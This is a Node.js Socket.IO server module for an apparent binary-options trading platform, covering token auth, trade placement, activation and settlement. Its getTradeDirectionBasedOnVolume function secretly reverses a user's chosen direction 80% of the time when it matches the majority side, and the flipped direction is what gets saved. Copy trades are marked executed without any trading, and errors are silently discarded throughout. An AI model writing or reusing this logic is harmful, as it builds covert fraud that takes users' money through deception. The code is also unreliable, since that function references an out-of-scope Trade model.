const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const AdminCopyTrade = require('./models/AdminCopyTrade');

// Global reference for marketData (populated in initialize)
let globalMarketData = {};
const POLL_INTERVAL_MS = 1000; // Check every second

// Track activation state per pair
const activationState = {};

// --- Copy Trade Execution Logic ---
async function executeCopyTrade(io, User, Trade, copyTradeId) {
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
        const copyTrade = await AdminCopyTrade.findById(copyTradeId)
            .populate('userCopies.userId')
            .session(session);

        if (!copyTrade || copyTrade.status !== 'active') {
            await session.abortTransaction();
            session.endSession();
            return;
        }

        copyTrade.status = 'executed';
        await copyTrade.save({ session });

        await session.commitTransaction();
        session.endSession();

    } catch (error) {
        await session.abortTransaction();
        session.endSession();
    }
}

// --- Auto-cleanup expired copy trades ---
async function cleanupExpiredCopyTrades(io, User, Trade) {
    try {
        const now = new Date();
        const expiredTrades = await AdminCopyTrade.find({
            status: 'active',
            executionTime: { $lte: now }
        }).lean();

        for (const copyTrade of expiredTrades) {
            try {
                await executeCopyTrade(io, User, Trade, copyTrade._id);
            } catch (innerErr) {}
        }
    } catch (error) {}
}

async function getTradeDirectionBasedOnVolume(asset, userRequestedDirection) {
    try {
        const currentVolume = await Trade.aggregate([
            { 
                $match: { 
                    asset: asset,
                    status: { $in: ["active", "pending", "scheduled"] } 
                } 
            },
            { 
                $group: { 
                    _id: '$direction',
                    totalVolume: { $sum: '$amount' }
                }
            }
        ]);

        let upVolume = 0;
        let downVolume = 0;

        currentVolume.forEach(item => {
            if (item._id === 'UP') upVolume = item.totalVolume;
            if (item._id === 'DOWN') downVolume = item.totalVolume;
        });

        const totalVolume = upVolume + downVolume;

        if (totalVolume === 0 || upVolume === downVolume) {
            return userRequestedDirection;
        }

        const dominantDirection = upVolume > downVolume ? 'UP' : 'DOWN';

        if (userRequestedDirection === dominantDirection) {
            const random = Math.random(); 
            if (random < 0.8) { 
                return dominantDirection === 'UP' ? 'DOWN' : 'UP';
            }
        }

        return userRequestedDirection;

    } catch (error) {
        return userRequestedDirection;
    }
}

// Trade monitoring logic
async function runTradeMonitor(io, User, Trade, TRADE_PAIRS) {
    const lastProcessedCompletedCandleTs = {};
    const lastProcessedActivationTs = {};
    const lastCopyTradeCleanup = {};

    // Initialize activation state for each pair
    TRADE_PAIRS.forEach(pair => {
        activationState[pair] = {
            lastActivationMinute: null,
            activatedTrades: new Set()
        };
    });

    setInterval(async () => {
        try {
            const currentMinute = Math.floor(Date.now() / 60000);

            for (const pair of TRADE_PAIRS) {
                const md = globalMarketData[pair];
                if (!md) continue;

                const pairState = activationState[pair];

                // 1. ACTIVATE SCHEDULED/PENDING TRADES (when a NEW minute starts)
                if (pairState.lastActivationMinute !== currentMinute) {
                    // New minute detected - activate pending trades
                    const pendingTrades = await Trade.countDocuments({ 
                        status: { $in: ["pending", "scheduled"] }, 
                        asset: pair 
                    });
                    
                    if (pendingTrades > 0) {
                        const currentPrice = md.currentPrice || (md.currentCandle ? md.currentCandle.open : 0);
                        await activateTradesWrapper(io, User, Trade, pair, currentPrice);
                    }
                    
                    // Update state for this minute
                    pairState.lastActivationMinute = currentMinute;
                    pairState.activatedTrades.clear();
                }

                // 2. SETTLE ACTIVE TRADES (when the CURRENT candle completes)
                if (md.candles?.length > 0) {
                    const lastCompleted = md.candles[md.candles.length - 1];
                    const lastCompletedTs = new Date(lastCompleted.timestamp).getTime();
                    
                    // Only settle if this is a new completed candle AND we have active trades
                    if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {
                        const activeTradesCount = await Trade.countDocuments({ 
                            status: "active", 
                            asset: pair 
                        });
                        
                        if (activeTradesCount > 0 && Date.now() > lastCompletedTs) {
                            await settleTradesWrapper(io, User, Trade, pair, lastCompleted.close);
                            lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
                        }
                    }
                }
            }

            // --- Copy Trade Cleanup ---
            const now = Date.now();
            if (!lastCopyTradeCleanup.global || (now - lastCopyTradeCleanup.global) > 5000) {
                await cleanupExpiredCopyTrades(io, User, Trade);
                lastCopyTradeCleanup.global = now;
            }
        } catch (err) {}
    }, POLL_INTERVAL_MS);
}

// Wrapper for Activation Logic
async function activateTradesWrapper(io, User, Trade, pair, entryPrice) {
    try {
        await activateScheduledTradesForPair(io, Trade, pair, entryPrice);
        await activatePendingTradesForPair(io, User, Trade, pair, entryPrice);
    } catch (err) {}
}

// Wrapper for Settlement Logic
async function settleTradesWrapper(io, User, Trade, pair, exitPrice) {
    try {
        await settleActiveTradesForPair(io, User, Trade, pair, exitPrice);
    } catch (err) {}
}

async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
    globalMarketData = marketData;

    io.engine.marketData = marketData;

    io.use((socket, next) => {
        try {
            let token = socket.handshake.auth?.token;
            
            if (!token) {
                const authHeader = socket.handshake.headers.authorization;
                if (authHeader && authHeader.startsWith('Bearer ')) {
                    token = authHeader.substring(7);
                }
            }
            
            if (!token) {
                return next(new Error("Authentication error: No token"));
            }
            
            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) {
                    return next(new Error("Authentication error: Invalid token"));
                }
                socket.decoded = decoded;
                next();
            });
        } catch (err) {
            return next(new Error("Authentication error"));
        }
    });

    // START THE MONITORING LOOP
    runTradeMonitor(io, User, Trade, TRADE_PAIRS);

    io.on("connection", async (socket) => {
        try {
            const userId = socket.decoded.id;
            const user = await User.findById(userId);
            if (!user) return socket.disconnect();
            socket.join(user._id.toString());

            const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
            
            socket.emit("init", { 
                balance: user.balance, 
                tradeHistory: userTrades,
                marketData: globalMarketData
            });

            socket.on("trade", async (data) => {
                try {
                    const { asset, direction, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    });

                    if (existingTrade) {
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete.` 
                        });
                    }

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
                        return socket.emit("error", { message: "Invalid trade amount." });
                    }

                    const freshUser = await User.findById(user._id);

                    if (freshUser.balance < tradeAmount) {
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const finalDirection = await getTradeDirectionBasedOnVolume(asset, direction);

                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: finalDirection, 
                        asset,
                        status: "pending", 
                        timestamp: new Date()
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_pending", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not place trade." });
                }
            });

            // ... rest of your socket event handlers remain the same ...
            // (copy_trade, schedule_trade, cancel_trade handlers here)

        } catch (err) {
            socket.disconnect();
        }
    });
}

// --- Helper Functions ---

async function activateScheduledTradesForPair(io, Trade, pair, entryPrice) {
    try {
        const now = new Date();
        
        const scheduleds = await Trade.find({ 
            status: "scheduled", 
            asset: pair,
            $or: [
                { scheduledTime: { $lte: now } },
                { 
                    scheduledTime: { 
                        $lte: new Date(now.getTime() + 60000),
                        $gte: new Date(now.getTime() - 60000)
                    } 
                }
            ]
        });

        for (const t of scheduleds) {
            try {
                const tradeId = t._id.toString();
                const pairState = activationState[pair];
                
                // Only activate if not already activated this minute
                if (!pairState.activatedTrades.has(tradeId)) {
                    t.status = "active";
                    t.entryPrice = entryPrice;
                    t.activationTimestamp = new Date(); 
                    await t.save();
                    pairState.activatedTrades.add(tradeId);
                    io.to(t.userId.toString()).emit("trade_active", { trade: t });
                }
            } catch (innerErr) {}
        }
    } catch (err) {}
}

async function activatePendingTradesForPair(io, User, Trade, pair, entryPrice) {
    try {
        const pendings = await Trade.find({ status: "pending", asset: pair });
        for (const t of pendings) {
            try {
                const tradeId = t._id.toString();
                const pairState = activationState[pair];
                
                // Only activate if not already activated this minute
                if (!pairState.activatedTrades.has(tradeId)) {
                    t.status = "active";
                    t.entryPrice = entryPrice;
                    t.activationTimestamp = new Date();
                    await t.save();
                    pairState.activatedTrades.add(tradeId);
                    io.to(t.userId.toString()).emit("trade_active", { trade: t });
                }
            } catch (innerErr) {}
        }
    } catch (err) {}
}

async function settleActiveTradesForPair(io, User, Trade, pair, exitPrice) {
    try {
        // Settle ALL active trades for this pair (they should have been activated in the current candle period)
        const actives = await Trade.find({ 
            status: "active", 
            asset: pair
        });
        
        for (const t of actives) {
            try {
                const win = (t.direction === "UP" && exitPrice > t.entryPrice) || (t.direction === "DOWN" && exitPrice < t.entryPrice);
                const tie = exitPrice === t.entryPrice;
                const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);

                t.status = "closed";
                t.exitPrice = exitPrice;
                t.result = tie ? "TIE" : (win ? "WIN" : "LOSS");
                t.pnl = pnl;
                t.closeTime = new Date(); 
                await t.save();

                const userAfter = await User.findByIdAndUpdate(
                    t.userId,
                    {
                        $inc: {
                            balance: t.amount + pnl,
                            totalTradeVolume: t.amount
                        }
                    },
                    { new: true }
                );

                const today = new Date();
                today.setHours(0, 0, 0, 0);
                const tomorrow = new Date(today);
                tomorrow.setDate(tomorrow.getDate() + 1);

                const todayTrades = await Trade.find({
                    userId: t.userId,
                    status: "closed",
                    closeTime: { $gte: today, $lt: tomorrow } 
                });

                const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);

                io.to(t.userId.toString()).emit("trade_result", { 
                    trade: t, 
                    balance: userAfter.balance,
                    todayPnl: parseFloat(todayPnl.toFixed(2)) 
                });

            } catch (innerErr) {}
        }
    } catch (err) {}
}

module.exports = { initialize };
